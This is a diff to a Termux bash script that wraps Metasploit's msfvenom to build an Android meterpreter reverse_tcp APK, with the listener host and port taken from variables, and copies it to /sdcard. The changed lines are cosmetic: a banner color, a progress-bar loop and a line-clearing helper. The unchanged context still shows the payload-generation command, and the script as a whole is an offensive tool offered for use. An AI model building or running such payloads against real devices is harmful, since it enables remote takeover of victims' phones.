@@ -1,6 +1,6 @@
 #!/usr/bin/bash
 
-c1=$'\e[0;1;38;2;66;133;255m'
+c1=$'\e[0;1;38;2;0;230;118m'
 c2=$'\e[0;38;2;50;60;70m'
 c3=$'\e[0m'
 slp=$'sleep 0.03'
@@ -31,6 +31,11 @@ fi; }
 
 if [ -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then
 
+let_do() {
+echo -ne "                                                \r"
+NORM
+}
+
 #banner
 clear
 echo -e "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m
@@ -60,9 +65,15 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /data/
 cd /data/data/com.termux/files/usr/tmp
 mv $app.apk /sdcard ;}
 
-echo -e "${c1}Creating Payload wait..."
+printf "${c1}Creating Payload wait...                   \r"
+sleep 1.2
+
 function progress_bar() {
 while true ;do
+if [ -f "/sdcard/${app}.apk" ];then
+let_do
+break
+fi
 echo -ne "${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}             \r"
 $slp
 echo -ne "${c1}▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
@@ -111,10 +122,8 @@ echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
 $slp
 echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬${c3}         \r"
 $slp
-echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}              \r"
 if [ -f "/sdcard/${app}.apk" ];then
-echo -ne "                                                \r"
-NORM
+let_do
 break
 fi
 done
